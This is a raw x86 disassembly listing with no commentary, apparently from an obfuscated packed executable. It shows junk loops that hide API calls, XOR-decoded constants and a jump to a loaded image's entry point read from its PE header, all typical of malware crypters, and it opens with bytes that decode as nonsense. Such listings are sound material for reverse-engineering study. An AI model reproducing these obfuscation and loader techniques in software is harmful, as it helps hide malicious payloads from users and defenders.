  409b21:	sub    eax,0x60da7a1
  409b26:	ins    BYTE PTR es:[edi],dx
  409b27:	cli    
  409b28:	int3   
  409b29:	jbe    0x409b97
  409b2b:	pop    edx
  409b2c:	fisttp WORD PTR [edi+0x255be15d]
  409b32:	push   ss
  409b33:	mov    ds:0x304716e4,al
  409b38:	push   ebx
  409b39:	mov    DWORD PTR [ebx+ebp*1-0x7b564820],ecx
  409b40:	push   ds
  409b41:	div    DWORD PTR [edi-0x6fd94a23]
  409b47:	add    eax,0x920b8aa7
  409b4c:	and    al,0x1
  409b4f:	(bad)  
  409b50:	and    BYTE PTR [ebp+0x5ae003a0],bl
  409b56:	push   0x5de7244a
  409b5b:	dec    eax
  409b5c:	cmp    al,0xd
  409b5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b5f:	jo     0x409bc8
  409b61:	pop    ebx
  409b62:	test   BYTE PTR [ebp+0x7c08a65c],ah
  409b68:	pop    ecx
  409b69:	mov    ebp,DWORD PTR ds:0xfb3fe89c
  409b6f:	pop    ecx
  409b70:	(bad)  
  409b71:	dec    edi
  409b72:	(bad)  
  409b73:	in     al,dx
  409b74:	sub    edi,DWORD PTR [edx]
  409b76:	cdq    
  409b77:	call   0x354c:0xa394
  409b7d:	ret    0xbc15
  409b80:	icebp  
  409b81:	inc    esp
  409b82:	adc    al,0x78
  409b84:	push   edi
  409b85:	lods   eax,DWORD PTR ds:[esi]
  409b86:	cli    
  409b87:	sub    al,0xa7
  409b89:	jnp    0x409bef
  409b8b:	pop    esi
  409b8c:	add    al,0x8f
  409b8e:	sti    
  409b8f:	sbb    al,0xf9
  409b91:	pop    edx
  409b92:	mov    eax,ds:0x2a20c287
  409b97:	jmp    0xc3b4:0xb5828466
  409b9e:	and    BYTE PTR [ecx],dh
  409ba0:	aad    0xcd
  409ba2:	loope  0x409c20
  409ba4:	dec    edi
  409ba5:	inc    edx
  409ba6:	pop    es
  409ba7:	sub    cl,ah
  409ba9:	and    ah,bh
  409bab:	mov    ds:0x689c436a,eax
  409bb0:	(bad)
  409bb3:	shl    DWORD PTR [edi-0x35],1
  409bb6:	push   esi
  409bb7:	sub    BYTE PTR [ecx+0x3863817c],0xde
  409bbe:	out    0x80,eax
  409bc0:	leave  
  409bc1:	loopne 0x409be8
  409bc3:	ds je  0x409bf1
  409bc6:	fadd   DWORD PTR [edx-0xa]
  409bc9:	jbe    0x409c33
  409bcb:	pop    ds
  409bcc:	retf   
  409bcd:	adc    al,0xd8
  409bcf:	and    BYTE PTR [eax-0x4ecfec41],ah
  409bd5:	sub    DWORD PTR [esi-0x9],eax
  409bd8:	outs   dx,BYTE PTR ds:[esi]
  409bd9:	adc    esi,edx
  409bdb:	inc    eax
  409bdc:	inc    sp
  409bde:	dec    edi
  409bdf:	mov    esp,0x92274732
  409be4:	mov    ds:0x7d56f2a7,eax
  409be9:	jns    0x409b90
  409beb:	dec    ecx
  409bec:	test   al,0x0
  409bee:	cwde   
  409bef:	les    ebx,FWORD PTR [edx+0x58d4e00b]
  409bf5:	aad    0x4c
  409bf7:	pop    esp
  409bf8:	adc    eax,0xc0925184
  409bfd:	or     DWORD PTR [ebx],esi
  409bff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c00:	popa   
  409c01:	jl     0x409bac
  409c03:	jge    0x409bd2
  409c05:	(bad)  
  409c06:	pop    esp
  409c07:	pop    ds
  409c08:	ins    DWORD PTR es:[edi],dx
  409c09:	data16 out dx,al
  409c0b:	lds    ebx,FWORD PTR [edi+0x7668455c]
  409c11:	sbb    bh,BYTE PTR [edi+0x5db0e3b7]
  409c17:	push   0xffffffb2
  409c19:	shl    esp,0x56
  409c1c:	sub    al,BYTE PTR [eax+0x51]
  409c1f:	rcl    BYTE PTR [ecx+0x271a05ad],0xd9
  409c26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c27:	push   esp
  409c28:	fnsave [esi]
  409c2a:	sub    DWORD PTR [edi+0x1ffd021c],eax
  409c30:	xor    al,0x9c
  409c32:	pop    edx
  409c33:	scas   eax,DWORD PTR es:[edi]
  409c34:	and    eax,0xe6ff99d5
  409c39:	pusha  
  409c3a:	aas    
  409c3b:	inc    esp
  409c3c:	js     0x409c92
  409c3e:	mov    ds:0x4f82cedb,al
  409c43:	imul   esp,edx,0xe03ed1e1
  409c49:	push   ebx
  409c4a:	fild   QWORD PTR ss:[esi+ebx*4-0x575f893f]
  409c52:	in     eax,dx
  409c53:	ins    DWORD PTR es:[edi],dx
  409c54:	sets   BYTE PTR [ecx+0x67aeb90e]
  409c5b:	jns    0x409c57
  409c5d:	addr16 cmp al,0xea
  409c60:	popa   
  409c61:	ja     0x409c07
  409c63:	mov    dl,0xc8
  409c65:	pop    ss
  409c66:	lahf   
  409c67:	mov    dh,BYTE PTR [esi+eiz*4-0x76733bf0]
  409c6e:	dec    ebp
  409c6f:	std    
  409c70:	and    esp,eax
  409c72:	mov    dl,0x40
  409c74:	lods   al,BYTE PTR ds:[esi]
  409c75:	leave  
  409c76:	rcl    esi,0x2d
  409c79:	adc    eax,0x7cc1b9d8
  409c7e:	xor    al,0x46
  409c80:	ud2    
  409c82:	fwait
  409c83:	xlat   BYTE PTR ds:[ebx]
  409c84:	mov    edi,0xcf72de87
  409c89:	mov    BYTE PTR [ebx-0x12fd0904],dh
  409c8f:	es inc esp
  409c91:	hlt    
  409c92:	jge    0x409cb6
  409c94:	inc    ebx
  409c95:	or     al,0x2e
  409c97:	enter  0x132e,0x5b
  409c9b:	div    BYTE PTR [edi-0x27]
  409c9e:	jg     0x409c86
  409ca0:	sahf   
  409ca1:	in     eax,0x49
  409ca3:	push   es
  409ca4:	jmp    0xf9a9f664
  409ca9:	jo     0x409ce6
  409cab:	in     al,dx
  409cac:	pop    eax
  409cad:	in     al,dx
  409cae:	nop
  409caf:	dec    edi
  409cb0:	outs   dx,DWORD PTR es:[esi]
  409cb2:	and    eax,0x155011b0
  409cb7:	lea    esp,[edx-0x2670385c]
  409cbd:	push   ss
  409cbe:	mov    ebp,0x46521f7a
  409cc3:	cmp    eax,0x78558164
  409cc8:	jo     0x409ce5
  409cca:	add    esi,DWORD PTR [esi+0x38]
  409ccd:	dec    ebp
  409cce:	mov    ebp,0xbfd03304
  409cd4:	fs (bad) 
  409cd6:	int    0xff
  409cd8:	sub    edi,edx
  409cda:	add    edi,DWORD PTR [ebp-0x10]
  409cdd:	mov    edx,DWORD PTR [ebp-0x20]
  409ce0:	mov    ebx,DWORD PTR [ebp-0x8]
  409ce3:	xor    edx,eax
  409ce5:	add    edx,ecx
  409ce7:	imul   edx,ebx
  409cea:	cmp    edx,edi
  409cec:	jbe    0x407fba
  409cf2:	pop    ebx
  409cf3:	pop    edi
  409cf4:	leave  
  409cf5:	ret    0x8
  409cf8:	push   ebp
  409cf9:	mov    ebp,esp
  409cfb:	sub    esp,0x70
  409cfe:	xor    DWORD PTR ds:0x43437a,0x600e
  409d08:	push   0x4162b4
  409d0d:	call   DWORD PTR ds:0x432d36
  409d13:	test   ax,ax
  409d16:	jne    0x409d2d
  409d1c:	add    DWORD PTR ds:0x432de2,0x43438a
  409d26:	xor    eax,eax
  409d28:	jmp    0x40a478
  409d2d:	call   DWORD PTR ds:0x432d92
  409d33:	cdq    
  409d34:	mov    DWORD PTR ds:0x432dd2,0x2a3f
  409d3e:	cmp    eax,0x98216565
  409d43:	jne    0x409d55
  409d49:	cmp    edx,0x98798767
  409d4f:	je     0x409d1c
  409d55:	push   0x4162c0
  409d5a:	sub    DWORD PTR ds:0x432dd2,0x490f
  409d64:	call   DWORD PTR ds:0x432ca2
  409d6a:	add    DWORD PTR ds:0x434421,0x7629
  409d74:	test   eax,eax
  409d76:	mov    DWORD PTR ds:0x432dc2,0x36af
  409d80:	jne    0x409d1c
  409d86:	sub    DWORD PTR ds:0x434421,0x434415
  409d90:	push   ebx
  409d91:	xor    DWORD PTR ds:0x432704,ecx
  409d97:	mov    ebx,0xf89c8531
  409d9c:	or     ecx,0x58cd
  409da2:	mov    DWORD PTR [ebp-0x8],ebx
  409da5:	xor    DWORD PTR ds:0x434429,0x5f13
  409daf:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  409db6:	and    DWORD PTR ds:0x43439a,0x0
  409dc0:	jmp    0x409dd2
  409dc5:	mov    ecx,DWORD PTR ds:0x43439a
  409dcb:	inc    ecx
  409dcc:	mov    DWORD PTR ds:0x43439a,ecx
  409dd2:	cmp    DWORD PTR ds:0x43439a,0x10
  409dd9:	jae    0x409e48
  409ddf:	cmp    DWORD PTR ds:0x43439a,0x13
  409de6:	jne    0x409dfc
  409dec:	push   0x432833
  409df1:	push   0x432718
  409df6:	call   DWORD PTR ds:0x432cfe
  409dfc:	jmp    0x409dc5
  409e01:	and    DWORD PTR ds:0x4343a2,0x0
  409e0b:	mov    ecx,DWORD PTR ds:0x4343a2
  409e11:	inc    ecx
  409e12:	mov    DWORD PTR ds:0x4343a2,ecx
  409e18:	cmp    DWORD PTR ds:0x4343a2,0x20
  409e1f:	jne    0x409e3b
  409e25:	push   DWORD PTR [ebp-0x1c]
  409e28:	push   DWORD PTR [ebp-0x10]
  409e2b:	push   0x1942
  409e30:	push   0x6344
  409e35:	call   DWORD PTR ds:0x432d02
  409e3b:	cmp    DWORD PTR ds:0x4343a2,0x1e
  409e42:	jb     0x409e0b
  409e48:	lea    eax,[ebp-0x18]
  409e4b:	sub    DWORD PTR ds:0x43442d,0x379b
  409e55:	mov    DWORD PTR [ebp-0x14],eax
  409e58:	lea    eax,[ebp-0x1c]
  409e5b:	and    DWORD PTR ds:0x432700,0x0
  409e65:	mov    ecx,DWORD PTR ds:0x432700
  409e6b:	inc    ecx
  409e6c:	mov    DWORD PTR ds:0x432700,ecx
  409e72:	cmp    DWORD PTR ds:0x432700,0x20
  409e79:	jne    0x409e98
  409e7f:	push   DWORD PTR [ebp-0xc]
  409e82:	push   DWORD PTR [ebp-0x10]
  409e85:	push   0x37d5
  409e8a:	push   0x73f1
  409e8f:	push   DWORD PTR [ebp-0x1c]
  409e92:	call   DWORD PTR ds:0x4329d6
  409e98:	cmp    DWORD PTR ds:0x432700,0x18
  409e9f:	jb     0x409e65
  409ea5:	and    DWORD PTR ds:0x4326ec,0x0
  409eaf:	mov    ecx,DWORD PTR ds:0x4326ec
  409eb5:	inc    ecx
  409eb6:	mov    DWORD PTR ds:0x4326ec,ecx
  409ebc:	cmp    DWORD PTR ds:0x4326ec,0x19
  409ec3:	jne    0x409ed4
  409ec9:	push   0x477f
  409ece:	call   DWORD PTR ds:0x4329da
  409ed4:	cmp    DWORD PTR ds:0x4326ec,0x13
  409edb:	jb     0x409eaf
  409ee1:	mov    ecx,DWORD PTR ds:0x432dd6
  409ee7:	xor    DWORD PTR ds:0x43439e,ecx
  409eed:	mov    DWORD PTR [ebp-0xc],eax
  409ef0:	and    DWORD PTR ds:0x4326f4,0x0
  409efa:	jmp    0x409f0d
  409eff:	xor    eax,eax
  409f01:	add    eax,DWORD PTR ds:0x4326f4
  409f07:	inc    eax
  409f08:	mov    ds:0x4326f4,eax
  409f0d:	cmp    DWORD PTR ds:0x4326f4,0x1a
  409f14:	jae    0x409f4f
  409f1a:	cmp    DWORD PTR ds:0x4326f4,0x21
  409f21:	jne    0x409f4a
  409f27:	push   0x432de6
  409f2c:	push   DWORD PTR [ebp-0x28]
  409f2f:	push   DWORD PTR [ebp-0x18]
  409f32:	push   0x87ba
  409f37:	push   0x20df
  409f3c:	push   0x519b
  409f41:	push   DWORD PTR [ebp-0x18]
  409f44:	call   DWORD PTR ds:0x432d06
  409f4a:	jmp    0x409eff
  409f4f:	mov    eax,ds:0x4161a0
  409f54:	mov    DWORD PTR ds:0x4326f4,0x19
  409f5e:	cmp    DWORD PTR ds:0x4326f4,0x0
  409f65:	je     0x409fb2
  409f6b:	cmp    DWORD PTR ds:0x4326f4,0x21
  409f72:	jne    0x409fa0
  409f78:	push   0x2812
  409f7d:	push   0x6a58
  409f82:	push   DWORD PTR [ebp-0x24]
  409f85:	push   0x8f98
  409f8a:	push   DWORD PTR [ebp-0x20]
  409f8d:	push   0x26e4
  409f92:	push   DWORD PTR [ebp-0x14]
  409f95:	push   0x4328ab
  409f9a:	call   DWORD PTR ds:0x432d0a
  409fa0:	mov    ecx,DWORD PTR ds:0x4326f4
  409fa6:	dec    ecx
  409fa7:	mov    DWORD PTR ds:0x4326f4,ecx
  409fad:	jmp    0x409f5e
  409fb2:	mov    eax,DWORD PTR [eax+0x1c8]
  409fb8:	xor    DWORD PTR ds:0x4326f4,edx
  409fbe:	mov    eax,DWORD PTR [eax]
  409fc0:	mov    ecx,DWORD PTR [ebp-0xc]
  409fc3:	add    DWORD PTR ds:0x4326f0,0x3eda
  409fcd:	push   esi
  409fce:	mov    esi,0x7510855
  409fd3:	sbb    DWORD PTR ds:0x434415,0x118a
  409fdd:	xor    eax,esi
  409fdf:	sbb    DWORD PTR ds:0x43438e,0x43437a
  409fe9:	push   edi
  409fea:	xor    edi,DWORD PTR ds:0x43438a
  409ff0:	mov    edi,0x32729c
  409ff5:	adc    DWORD PTR ds:0x434415,0x7b86
  409fff:	add    eax,edi
  40a001:	mov    DWORD PTR [ecx],eax
  40a003:	mov    eax,ds:0x4163b4
  40a008:	mov    DWORD PTR ds:0x432dde,0x674a
  40a012:	cmp    eax,0x23c13046
  40a017:	mov    eax,DWORD PTR [ebp-0x4]
  40a01a:	je     0x40a046
  40a020:	mov    ecx,DWORD PTR [ebp-0x8]
  40a023:	xor    eax,esi
  40a025:	sub    DWORD PTR ds:0x4326f4,0x7cc4
  40a02f:	add    eax,edi
  40a031:	add    DWORD PTR ds:0x434386,0x4326f4
  40a03b:	imul   eax,ecx
  40a03e:	mov    DWORD PTR [ebp-0x8],eax
  40a041:	jmp    0x40a156
  40a046:	and    DWORD PTR ds:0x432dde,0x0
  40a050:	mov    ecx,DWORD PTR ds:0x432dde
  40a056:	inc    ecx
  40a057:	mov    DWORD PTR ds:0x432dde,ecx
  40a05d:	cmp    DWORD PTR ds:0x432dde,0x26
  40a064:	jne    0x40a07d
  40a06a:	push   DWORD PTR [ebp-0x18]
  40a06d:	push   0x709e
  40a072:	push   0x1359
  40a077:	call   DWORD PTR ds:0x432d0e
  40a07d:	cmp    DWORD PTR ds:0x432dde,0x19
  40a084:	jb     0x40a050
  40a08a:	xor    eax,esi
  40a08c:	and    DWORD PTR ds:0x434396,0x0
  40a096:	mov    ecx,DWORD PTR ds:0x434396
  40a09c:	inc    ecx
  40a09d:	mov    DWORD PTR ds:0x434396,ecx
  40a0a3:	cmp    DWORD PTR ds:0x434396,0x10
  40a0aa:	jne    0x40a0c0
  40a0b0:	push   0x432805
  40a0b5:	push   0x43281d
  40a0ba:	call   DWORD PTR ds:0x4329de
  40a0c0:	cmp    DWORD PTR ds:0x434396,0xf
  40a0c7:	jne    0x40a0da
  40a0cd:	mov    ecx,DWORD PTR ds:0x434396
  40a0d3:	inc    ecx
  40a0d4:	mov    DWORD PTR ds:0x434396,ecx
  40a0da:	cmp    DWORD PTR ds:0x434396,0x1e
  40a0e1:	jb     0x40a096
  40a0e7:	add    eax,edi
  40a0e9:	mov    ds:0x4162b0,eax
  40a0ee:	mov    ecx,DWORD PTR ds:0x434366
  40a0f4:	sbb    DWORD PTR ds:0x434415,ecx
  40a0fa:	mov    eax,DWORD PTR [ebp-0x8]
  40a0fd:	sbb    ecx,DWORD PTR ds:0x432dd6
  40a103:	xor    eax,esi
  40a105:	not    ecx
  40a107:	add    eax,edi
  40a109:	mov    ds:0x4163b4,eax
  40a10e:	mov    eax,DWORD PTR [ebp-0x4]
  40a111:	mov    ecx,DWORD PTR ds:0x4162b0
  40a117:	sub    DWORD PTR ds:0x4326f0,0x434415
  40a121:	xor    eax,esi
  40a123:	add    eax,edi
  40a125:	mov    DWORD PTR ds:0x434392,0x307
  40a12f:	cmp    ecx,eax
  40a131:	jne    0x40a156
  40a137:	xor    DWORD PTR ds:0x432dce,0x57b5
  40a141:	push   DWORD PTR [ebp-0x4]
  40a144:	sub    DWORD PTR ds:0x434419,0x6bc5
  40a14e:	push   DWORD PTR [ebp-0x8]
  40a151:	call   0x40a47c
  40a156:	mov    eax,ds:0x4161a0
  40a15b:	mov    eax,DWORD PTR [eax+0x18c]
  40a161:	xor    ecx,ecx
  40a163:	mov    eax,DWORD PTR [eax]
  40a165:	sbb    DWORD PTR ds:0x434411,edx
  40a16b:	mov    DWORD PTR [ebp-0x20],eax
  40a16e:	inc    edx
  40a16f:	mov    eax,0xf89c853d
  40a174:	mov    DWORD PTR [ebp-0x24],eax
  40a177:	or     DWORD PTR ds:0x43436a,edx
  40a17d:	mov    DWORD PTR [ebp-0x24],eax
  40a180:	and    DWORD PTR ds:0x43439a,0x0
  40a18a:	jmp    0x40a19c
  40a18f:	mov    edx,DWORD PTR ds:0x43439a
  40a195:	inc    edx
  40a196:	mov    DWORD PTR ds:0x43439a,edx
  40a19c:	cmp    DWORD PTR ds:0x43439a,0x10
  40a1a3:	jae    0x40a1f4
  40a1a9:	cmp    DWORD PTR ds:0x43439a,0x6
  40a1b0:	jne    0x40a1d3
  40a1b6:	push   0x1088
  40a1bb:	push   DWORD PTR [ebp-0x1c]
  40a1be:	push   0x185d
  40a1c3:	push   0x432909
  40a1c8:	push   0x400000
  40a1cd:	call   DWORD PTR ds:0x4329e2
  40a1d3:	cmp    DWORD PTR ds:0x43439a,0x5
  40a1da:	jne    0x40a1ef
  40a1e0:	xor    edx,edx
  40a1e2:	or     edx,DWORD PTR ds:0x43439a
  40a1e8:	inc    edx
  40a1e9:	mov    DWORD PTR ds:0x43439a,edx
  40a1ef:	jmp    0x40a18f
  40a1f4:	mov    DWORD PTR [ebp-0x24],eax
  40a1f7:	mov    DWORD PTR [ebp-0xc],ebx
  40a1fa:	mov    DWORD PTR [ebp-0x24],eax
  40a1fd:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40a204:	mov    ebx,DWORD PTR [ebp-0x8]
  40a207:	and    edx,DWORD PTR ds:0x43439a
  40a20d:	mov    ecx,DWORD PTR [ebp-0x4]
  40a210:	and    DWORD PTR ds:0x432dce,0x0
  40a21a:	mov    edx,DWORD PTR ds:0x432dce
  40a220:	inc    edx
  40a221:	mov    DWORD PTR ds:0x432dce,edx
  40a227:	cmp    DWORD PTR ds:0x432dce,0x22
  40a22e:	jne    0x40a23a
  40a234:	call   DWORD PTR ds:0x4329e6
  40a23a:	cmp    DWORD PTR ds:0x432dce,0x17
  40a241:	jb     0x40a21a
  40a247:	mov    edx,DWORD PTR [ebp-0x4]
  40a24a:	xor    edx,esi
  40a24c:	xor    ecx,esi
  40a24e:	add    ecx,edx
  40a250:	mov    edx,DWORD PTR [ebp-0x4]
  40a253:	xor    ebx,esi
  40a255:	xor    edx,esi
  40a257:	add    ebx,edi
  40a259:	lea    ecx,[ecx+edx*1+0x9757d4]
  40a260:	cmp    ebx,ecx
  40a262:	ja     0x40a2c3
  40a268:	mov    eax,DWORD PTR [ebp-0x4]
  40a26b:	xor    eax,esi
  40a26d:	lea    eax,[eax+ebx*1+0x32729c]
  40a274:	push   eax
  40a275:	mov    eax,DWORD PTR [ebp-0xc]
  40a278:	xor    eax,esi
  40a27a:	lea    eax,[ebp+eax*1+0x3272a4]
  40a281:	push   eax
  40a282:	mov    eax,ds:0x4161a0
  40a287:	push   DWORD PTR [eax+0x1bc]
  40a28d:	call   0x401a05
  40a292:	mov    eax,DWORD PTR [ebp-0x4]
  40a295:	xor    eax,esi
  40a297:	lea    ebx,[ebx+eax*1+0x32729c]
  40a29e:	mov    eax,DWORD PTR [ebp-0x4]
  40a2a1:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2a4:	xor    ecx,esi
  40a2a6:	xor    eax,esi
  40a2a8:	add    eax,ecx
  40a2aa:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2ad:	xor    ecx,esi
  40a2af:	lea    eax,[eax+ecx*1+0x9757d4]
  40a2b6:	cmp    ebx,eax
  40a2b8:	jbe    0x40a268
  40a2be:	mov    eax,0xf89c853d
  40a2c3:	mov    ecx,DWORD PTR [ebp+0xc]
  40a2c6:	mov    DWORD PTR ds:0x416024,ecx
  40a2cc:	mov    ecx,DWORD PTR [ebp+0x10]
  40a2cf:	mov    DWORD PTR ds:0x416278,ecx
  40a2d5:	mov    ecx,DWORD PTR ds:0x416024
  40a2db:	mov    edx,DWORD PTR [ebp-0x14]
  40a2de:	sub    ecx,edi
  40a2e0:	xor    ecx,esi
  40a2e2:	mov    DWORD PTR [edx],ecx
  40a2e4:	mov    ecx,DWORD PTR [ebp-0x18]
  40a2e7:	cmp    ecx,0xf89c8530
  40a2ed:	je     0x40a34a
  40a2f3:	mov    ecx,DWORD PTR [ebp-0x8]
  40a2f6:	mov    edx,DWORD PTR [ebp-0x1c]
  40a2f9:	xor    ecx,esi
  40a2fb:	add    ecx,edi
  40a2fd:	cmp    ecx,edx
  40a2ff:	je     0x40a34a
  40a305:	mov    eax,ds:0x4161a0
  40a30a:	mov    eax,DWORD PTR [eax+0x194]
  40a310:	mov    ecx,DWORD PTR [eax]
  40a312:	mov    eax,DWORD PTR [ecx+0x3c]
  40a315:	push   DWORD PTR ds:0x416278
  40a31b:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40a31f:	push   DWORD PTR ds:0x416024
  40a325:	add    eax,ecx
  40a327:	mov    ecx,DWORD PTR ds:0x4161a0
  40a32d:	mov    ecx,DWORD PTR [ecx+0x194]
  40a333:	push   DWORD PTR [ecx]
  40a335:	call   eax
  40a337:	mov    ecx,DWORD PTR ds:0x4161a0
  40a33d:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40a343:	mov    DWORD PTR [ecx],eax
  40a345:	jmp    0x40a45a
  40a34a:	mov    ecx,DWORD PTR [ebp-0x8]
  40a34d:	mov    edx,DWORD PTR [ebp-0x20]
  40a350:	xor    ecx,esi
  40a352:	add    ecx,edi
  40a354:	cmp    ecx,edx
  40a356:	jne    0x40a43d
  40a35c:	mov    ecx,DWORD PTR [ebp-0x8]
  40a35f:	xor    ecx,esi
  40a361:	add    ecx,edi
  40a363:	mov    DWORD PTR ds:0x416224,ecx
  40a369:	mov    ecx,DWORD PTR [ebp-0x8]
  40a36c:	xor    ecx,esi
  40a36e:	add    ecx,edi
  40a370:	mov    DWORD PTR ds:0x41621c,ecx
  40a376:	mov    ecx,DWORD PTR [ebp-0x4]
  40a379:	mov    DWORD PTR [ebp-0xc],ecx
  40a37c:	mov    ecx,DWORD PTR [ebp-0x8]
  40a37f:	mov    DWORD PTR [ebp+0xc],ecx
  40a382:	mov    ecx,DWORD PTR [ebp+0xc]
  40a385:	xor    ecx,esi
  40a387:	add    ecx,edi
  40a389:	mov    DWORD PTR [ebp+0xc],ecx
  40a38c:	mov    ecx,DWORD PTR ds:0x416020
  40a392:	mov    ecx,DWORD PTR [ecx]
  40a394:	mov    DWORD PTR [ebp+0xc],ecx
  40a397:	mov    ecx,DWORD PTR ds:0x416228
  40a39d:	mov    ecx,DWORD PTR [ecx]
  40a39f:	mov    DWORD PTR [ebp-0x14],ecx
  40a3a2:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40a3a9:	mov    ecx,DWORD PTR [ebp+0x10]
  40a3ac:	xor    ecx,esi
  40a3ae:	add    ecx,edi
  40a3b0:	mov    DWORD PTR [ebp+0x10],ecx
  40a3b3:	mov    ecx,DWORD PTR ds:0x4161a0
  40a3b9:	mov    DWORD PTR [ebp+0x10],ecx
  40a3bc:	mov    ecx,DWORD PTR [ebp+0xc]
  40a3bf:	mov    DWORD PTR [ebp+0xc],ecx
  40a3c2:	mov    ecx,DWORD PTR [ebp+0xc]
  40a3c5:	push   0x4
  40a3c7:	pop    edx
  40a3c8:	sub    edx,ecx
  40a3ca:	add    edx,DWORD PTR [ebp-0x14]
  40a3cd:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40a3d4:	mov    DWORD PTR [ebp+0x10],edx
  40a3d7:	mov    DWORD PTR [ebp-0x70],eax
  40a3da:	mov    eax,DWORD PTR [ebp+0xc]
  40a3dd:	mov    DWORD PTR [ebp-0x6c],eax
  40a3e0:	mov    eax,DWORD PTR [ebp+0x10]
  40a3e3:	mov    DWORD PTR [ebp-0x68],eax
  40a3e6:	mov    eax,DWORD PTR [ebp-0x24]
  40a3e9:	xor    eax,esi
  40a3eb:	add    eax,edi
  40a3ed:	mov    DWORD PTR [ebp-0x64],eax
  40a3f0:	lea    eax,[ebp-0x2c]
  40a3f3:	mov    DWORD PTR [ebp-0x60],eax
  40a3f6:	mov    eax,DWORD PTR [ebp-0x70]
  40a3f9:	xor    eax,esi
  40a3fb:	add    eax,edi
  40a3fd:	mov    DWORD PTR [ebp-0x70],eax
  40a400:	lea    eax,[ebp-0x70]
  40a403:	push   eax
  40a404:	mov    eax,DWORD PTR [ebp-0xc]
  40a407:	xor    eax,esi
  40a409:	add    eax,edi
  40a40b:	push   eax
  40a40c:	mov    eax,ds:0x4161c0
  40a411:	push   0x416116
  40a416:	push   DWORD PTR [eax]
  40a418:	call   0x40d076
  40a41d:	xor    esi,esi
  40a41f:	mov    eax,DWORD PTR [ebp+0x10]
  40a422:	sub    eax,esi
  40a424:	push   eax
  40a425:	mov    eax,DWORD PTR [ebp+0xc]
  40a428:	add    eax,esi
  40a42a:	push   eax
  40a42b:	call   0x407765
  40a430:	inc    esi
  40a431:	cmp    esi,0x52
  40a434:	jb     0x40a41f
  40a43a:	mov    eax,DWORD PTR [ebp-0xc]
  40a43d:	call   0x405bf4
  40a442:	lea    eax,[ebp+0x4]
  40a445:	mov    DWORD PTR [ebp-0x28],eax
  40a448:	mov    eax,DWORD PTR [ebp-0x10]
  40a44b:	mov    eax,DWORD PTR [ebp-0x4]
  40a44e:	push   DWORD PTR [ebp-0x8]
  40a451:	lea    eax,[ebp-0x28]
  40a454:	push   eax
  40a455:	call   0x40c78b
  40a45a:	mov    eax,ds:0x4161a0
  40a45f:	push   0x4
  40a461:	add    eax,0x1cc
  40a466:	push   eax
  40a467:	lea    eax,[ebp-0x10]
  40a46a:	push   eax
  40a46b:	call   0x401a05
  40a470:	mov    eax,DWORD PTR [ebp-0x10]
  40a473:	mov    eax,DWORD PTR [eax]
  40a475:	pop    edi
  40a476:	pop    esi
  40a477:	pop    ebx
  40a478:	leave  
  40a479:	ret    0xc
  40a47c:	push   ebp
  40a47d:	mov    ebp,esp
  40a47f:	sub    esp,0x24
  40a482:	xor    ecx,ecx
  40a484:	or     ecx,DWORD PTR ds:0x434425
  40a48a:	sub    ecx,DWORD PTR ds:0x43442d
  40a490:	mov    DWORD PTR ds:0x434425,ecx
  40a496:	mov    eax,ds:0x4161a0
  40a49b:	mov    DWORD PTR ds:0x434392,0x17
  40a4a5:	cmp    DWORD PTR ds:0x434392,0x0
  40a4ac:	je     0x40a506
  40a4b2:	cmp    DWORD PTR ds:0x434392,0x5
  40a4b9:	jne    0x40a4d4
  40a4bf:	push   0x378d
  40a4c4:	push   0x43437a
  40a4c9:	push   0x4a36
  40a4ce:	call   DWORD PTR ds:0x432c56
  40a4d4:	cmp    DWORD PTR ds:0x434392,0x6
  40a4db:	jne    0x40a4ee
  40a4e1:	mov    ecx,DWORD PTR ds:0x434392
  40a4e7:	dec    ecx
  40a4e8:	mov    DWORD PTR ds:0x434392,ecx
  40a4ee:	mov    ecx,DWORD PTR ds:0x434392
  40a4f4:	dec    ecx
  40a4f5:	mov    DWORD PTR ds:0x434392,ecx
  40a4fb:	jmp    0x40a4a5
  40a500:	add    DWORD PTR ds:0x432de6,edx
  40a506:	mov    eax,DWORD PTR [eax+0x198]
  40a50c:	mov    ecx,DWORD PTR ds:0x434465
  40a512:	mov    ecx,DWORD PTR [ecx]
  40a514:	sub    DWORD PTR ds:0x434372,ecx
  40a51a:	mov    DWORD PTR [ebp-0x8],eax
  40a51d:	xor    eax,eax
  40a51f:	add    eax,DWORD PTR ds:0x434366
  40a525:	and    eax,DWORD PTR ds:0x4326f4
  40a52b:	mov    ds:0x434366,eax
  40a530:	mov    eax,DWORD PTR [ebp+0x8]
  40a533:	mov    ecx,DWORD PTR [ebp-0x8]
  40a536:	sub    DWORD PTR ds:0x432dde,0x4326f0
  40a540:	push   ebx
  40a541:	adc    DWORD PTR ds:0x434396,ebx
  40a547:	push   esi
  40a548:	mov    esi,0x7510855
  40a54d:	and    DWORD PTR ds:0x432dca,0x0
  40a557:	mov    ebx,DWORD PTR ds:0x432dca
  40a55d:	inc    ebx
  40a55e:	mov    DWORD PTR ds:0x432dca,ebx
  40a564:	cmp    DWORD PTR ds:0x432dca,0x2c
  40a56b:	jne    0x40a57a
  40a571:	push   DWORD PTR [ebp-0xc]
  40a574:	call   DWORD PTR ds:0x432c5a
  40a57a:	cmp    DWORD PTR ds:0x432dca,0x1e
  40a581:	jb     0x40a557
  40a587:	xor    eax,esi
  40a589:	and    DWORD PTR ds:0x4343a2,0x0
  40a593:	jmp    0x40a5a5
  40a598:	mov    ebx,DWORD PTR ds:0x4343a2
  40a59e:	inc    ebx
  40a59f:	mov    DWORD PTR ds:0x4343a2,ebx
  40a5a5:	cmp    DWORD PTR ds:0x4343a2,0x1a
  40a5ac:	jae    0x40a78c
  40a5b2:	cmp    DWORD PTR ds:0x4343a2,0x1d
  40a5b9:	jne    0x40a5cf
  40a5bf:	push   0x74a9
  40a5c4:	push   0x3c30
  40a5c9:	call   DWORD PTR ds:0x432c5e
  40a5cf:	jmp    0x40a598
  40a5d4:	jmp    0x40a78c
  40a5d9:	cmp    dh,BYTE PTR [esi+0x69734bd3]
  40a5df:	inc    edx
  40a5e0:	mov    ch,0x74
